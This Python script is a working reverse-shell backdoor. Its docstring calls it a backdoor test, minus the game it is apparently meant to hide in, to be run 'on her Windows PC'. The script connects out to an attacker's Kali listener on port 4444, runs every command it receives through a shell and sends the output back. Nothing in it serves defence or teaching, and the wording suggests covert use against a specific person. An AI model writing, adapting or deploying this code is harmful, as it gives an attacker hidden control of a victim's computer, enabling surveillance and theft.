#!/usr/bin/env python3
"""
Simple backdoor test - no game, just connection
Run this on her Windows PC to test if connection works
"""
import socket
import subprocess
import time

LISTENER_HOST = '10.12.72.171'  # Your Kali IP
LISTENER_PORT = 4444

print(f"Attempting to connect to {LISTENER_HOST}:{LISTENER_PORT}...")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((LISTENER_HOST, LISTENER_PORT))
    print("✓ CONNECTED!")
    
    while True:
        try:
            cmd = sock.recv(1024).decode().strip()
            if not cmd or cmd.lower() == 'exit':
                break
            
            print(f"Executing: {cmd}")
            
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                sock.send(output)
            except Exception as e:
                sock.send(f"Error: {str(e)}\n".encode())
        except Exception as e:
            print(f"Error: {e}")
            break
    
    sock.close()
    print("Connection closed")
    
except Exception as e:
    print(f"✗ CONNECTION FAILED: {e}")
    print("\nPossible issues:")
    print("  - Firewall blocking")
    print("  - Not on same network")
    print("  - Listener not running")

input("\nPress Enter to exit...")
